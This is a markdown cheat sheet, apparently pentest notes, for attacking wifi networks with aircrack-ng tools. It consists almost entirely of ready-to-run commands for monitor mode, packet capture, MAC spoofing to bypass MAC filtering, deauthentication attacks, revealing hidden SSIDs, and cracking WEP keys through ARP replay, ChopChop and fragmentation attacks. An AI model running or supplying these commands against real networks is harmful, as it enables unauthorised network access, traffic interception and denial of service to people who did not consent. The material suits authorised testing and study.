# Wifi Sec pentest

## Status of the wifi card
```
sudo iwconfig
```

## Monitor mode
```
aimon-ng start wlan1
```

```
iwconfig
```

## Scanning wifi
```
airodump-ng wlan1mon
```


## Scanning Wifi
```
sudo iwlist wlan1 scan
```

See link quality continuously on screen
```
watch -n 1 cat /proc/net/wireless
```

Using wavemon to scanning wifi
```
sudo apt install wavemon
```
```
sudo wavemon
```

## Mac Change:
```
ifconfig [intname] down
ifconfig [intname] hw ether [new_mac]
ifconfig [intname] up
```

## Set monitor mode:
```
iwconfig
ifconfig [intname] down
airmon-ng check kill
iwconfig [intname] mode monitor
iwconfig
ifconfig [intname] up 
ifconfig
```

## Sniffing wifi:
```
airodump-ng intname_mon
airodump-ng --bssid [bssid] --channel [channel#] --write [file] [intname_mon]
```

## Deauthentication Attack:
```
aireplay-ng --deauth [#DeauthPackets] -a [NetworkMAC] -c [targetMAC] [Interface]
```

## Hidden Networks
Check with airodump-ng, then run a deauth attack and then in airodump-ng on ESSID name should get the hidden network name.

Mac Auth Bypass:
- Check airodump and find the open networks.
- Get airodump on specific network.
- Get a Host to connect, and get the STATION MAC.
- Change MAC to the STATION MAC.
```
ifconfig [intname] down
sudo macchanger -m [mac_add] [int_name]
```

## WEP Cracking

Busy network:
- Capture a large number of packet/IVs
```
airodump-ng --bssid [bssid] --channel [channel#] --write [fileName] [intname_mon]
```
- Analyze the capture IVs and crack the key  (aircrack-ng)
```
aircrack-ng [fileName]
```
	key Found in HEX or ASCII
		
Idle network: (force the AP to generate new IVs) - Fake Authentication
- Capture a large number of packet/IVs
```
airodump-ng --bssid [bssid] --channel [channel#] --write [fileName] [intname_mon]
```
- Fake Authentication
```
aireplay-ng --fakeauth 0 -a [SSID_MAC] -h [ifconfig_8digits_unspec] [intname_mon]
```

Generate traffic:
ARP request replay
```
aireplay-ng --arpreplay -b [SSID_MAC] -h [ifconfig_8digits_unspec] [intname_mon]
```
- Analyze the capture IVs and crack the key  (aircrack-ng)
```
aircrack-ng [fileName]
```
	key Found in HEX or ASCII


	ChopChop Attacks
1. Capture a packet and determine its key stream
```
aireplay-ng --chopchop -b [SSID_MAC] -h [ifconfig_8digits_unspec] [intname_mon]
```
2. Forge a new packet
```
packetforge-ng  -0 -a [SSID_MAC] -h [ifconfig_8digits_unspec] -k 255.255.255.255 -l 255.255.255.255 -y [outFromLastStep.xor] -w [output]
```
3. Inject the forge packet into the traffic to generate new IVs.
```
aireplay-ng -2 -r [outFromLastStep] [intname_mon]
```
4. Analyze the capture IVs and crack the key  (aircrack-ng)
```
aircrack-ng [fileName]
```
	key Found in HEX or ASCII
	
	Fragmentation Attacks
1. Obtain PRGA (pseudo random generation algorithm)
```
aireplay-ng --fragment -b [SSID_MAC] -h [ifconfig_8digits_unspec] [intname_mon]
```
2. Forge a new packet
```
packetforge-ng  -0 -a [SSID_MAC] -h [ifconfig_8digits_unspec] -k 255.255.255.255 -l 255.255.255.255 -y [outFromLastStep.xor] -w [output]
```
3. Inject the forge packet into the traffic to generate new IVs.
```
aireplay-ng -2 -r [outFromLastStep] [intname_mon]
```
4. Analyze the capture IVs and crack the key  (aircrack-ng)
```
aircrack-ng [fileName]
```
	key Found in HEX or ASCII
